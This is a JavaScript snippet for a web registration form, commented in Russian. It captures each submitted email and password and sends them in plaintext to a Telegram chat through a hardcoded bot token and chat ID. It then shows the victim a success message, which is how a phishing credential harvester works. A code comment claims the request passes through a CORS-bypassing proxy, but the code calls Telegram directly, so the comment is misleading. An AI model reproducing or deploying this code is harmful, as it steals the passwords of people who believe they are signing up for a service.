document.getElementById("regForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const email = document.getElementById("email").value;
    const pass = document.getElementById("password").value;

    const token = "7814661354:AAE37b84riWeOefxx2AyZ_q2ixYTr41ykbc";
    const chat_id = "-4662287509";
    const message = `🟢 Новая регистрация:\n📧 Email: ${email}\n🔑 Пароль: ${pass}`;

    // Отправка запроса через прокси-сервер, который обходит CORS
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    }).then(response => {
        if (response.ok) {
            document.getElementById("regForm").style.display = "none";
            document.getElementById("response").style.display = "block";
        } else {
            alert("Ошибка при отправке. Попробуй позже.");
        }
    });
});
